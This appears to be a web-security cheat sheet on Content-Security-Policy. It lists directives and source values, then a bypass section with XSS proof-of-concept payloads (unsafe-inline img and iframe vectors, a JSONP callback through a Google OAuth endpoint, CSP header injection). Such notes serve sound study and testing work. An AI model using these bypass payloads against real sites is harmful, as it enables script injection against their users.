# Content-security-policy (CSP)

* **Params**
  * **Default-src**
    * This acts as a catchall for everything else.
  * **Script-src**
    * Describes where we can load javascript files from
  * **Style-src**
    * Describes where we can load stylesheets from
  * **Img-src**
    * Describes where we can load images from
  * **Connect-src**
    * Applies to AJAX and Websockets
  * **Font-src**
    * Describes where we can load fonts from
  * **Object-src**
    * Describes where we can l oad objects from (\<embed>)
  * **Media-src**
    * Describes where we can load audio and video files from
  * **frame-ancestors**
    * Describes which sites can load this site in an iframe
* **Values**
  * **\***
    * Load resources from anywhere
  * **'none'**
    * Block everything
  * **'Self'**
    * Can only load resources from same origin
  * **Data**
    * Can only load resources from data schema (Base64)
  * **Something.example.com**
    * Can only load resources from specified domain
  * **Https**
    * Can only load resources over HTTPS
  * **'Unsafe-inline'**
    * Allows inline elements (onclick,`<script></script>` tags, javascript)
  * **'Unsafe-eval'**
    * Allows dynamic code evaluation (eval() function)
  * **'Sha256-'**
    * Can only load resources if it matches the hash
  * **'Nonce-'**
    * Allows an inline script or CSS to execute if the script tag contains a nonce attribute matching the nonce specified in the CSP header
* <mark style="color:red;">**Bypass**</mark>
  * **Basic CSP Bypass**
    * Consider a CSP Header \
      `default-src ' self' *`
    * Allows all resources
    * Consider CSP Header\
      `script-src ' unsafe-inline' ' unsafe-eval' ' self' data: https://www.google.com http://www.google-analytics.com/gtm/js https://*.gstatic.com/feedback/ https://accounts.google.com;`
    * `unsafe-inline` allows&#x20;
      * `<img src="javascript:alert(1)">`
      * `<iframe/src=”data:text/html,<svg onload=alert(1)>”>`
  * **JSONP CSP Bypass**
    * JSONP uses callback object to serve JS payloads\
      `https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)`
    * Consider CSP Header\
      `script-src https://www.google.com http://www.google-analytics.com/gtm/js https://*.gstatic.com/feedback/ https://accounts.google.com;`
    * This payload would be blocked\
      `http://something.example.com/?vuln_param=javascript:alert(1);`
    * This would work\
      `http://something.example.com/?vuln_param=https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)`
  * **CSP Injection Bypass**
    * Consider the URL\
      `http://example.com/?vuln=`**`something_vuln_csp`**
    * If Input is reflected in CSP Header\
      `script-src`` `**`something_vuln_csp`**`; object-src 'none'; base-uri 'none'; require-trusted-types-for 'script'; report-uri https://csp.example.com;`
